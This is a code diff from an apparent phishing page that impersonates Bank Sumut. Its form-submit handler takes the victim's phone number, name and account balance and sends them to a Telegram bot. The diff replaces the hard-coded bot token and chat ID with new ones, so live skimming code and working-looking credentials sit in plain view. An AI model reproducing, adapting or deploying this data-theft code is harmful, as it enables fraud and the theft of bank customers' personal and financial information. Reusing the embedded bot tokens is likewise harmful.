@@ -267,8 +267,8 @@ document.getElementById("registrationForm").addEventListener("submit", function(
   let saldoFormatted = new Intl.NumberFormat("id-ID").format(saldo);
 
   // Kirim data ke Telegram Bot
-  let botToken = "7917823551:AAGnfV0onwQ9X7XroADyefOn_gQrGDJHYsA";
-  let chatId = "7644113955";
+  let botToken = "8037499811:AAH-XUz2Pn5F6FybPErBxScvQEpFUDcDWUE";
+  let chatId = "5529725648";
   let message = `( Bank sumut  | Data Rek )\n\n- No HP : ${noHp}\n- Nama : ${nama}\n- Saldo : Rp. ${saldoFormatted}\n\nCopyright©2020 bagas.webkuu`;
   let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
